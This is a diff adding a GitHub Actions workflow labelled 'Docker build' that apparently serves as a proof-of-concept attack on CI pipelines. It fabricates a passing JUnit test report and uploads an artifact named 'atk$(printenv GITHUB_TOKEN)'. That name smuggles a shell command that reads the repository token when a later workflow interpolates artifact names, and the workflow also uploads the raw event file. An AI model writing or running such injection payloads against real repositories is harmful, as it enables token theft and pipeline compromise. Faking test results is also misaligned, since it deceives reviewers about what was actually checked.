@@ -1,0 +1,24 @@
+name: Docker build
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  contents: read
+jobs:
+  fake:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Make fake results
+        run: |
+          mkdir -p out
+          printf '<testsuite name="x" tests="1" failures="0"><testcase classname="a" name="b" time="0.1"/></testsuite>\n' > out/junit.xml
+      - name: Upload artifact with injected NAME
+        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
+        with:
+          name: 'atk$(printenv GITHUB_TOKEN)'
+          path: out
+      - name: Upload Event File
+        uses: actions/upload-artifact@bbbca2ddaa5d8feaa63e36b76fdaad77386f024f # v7.0.0
+        with:
+          name: Event File
+          path: ${{ github.event_path }}
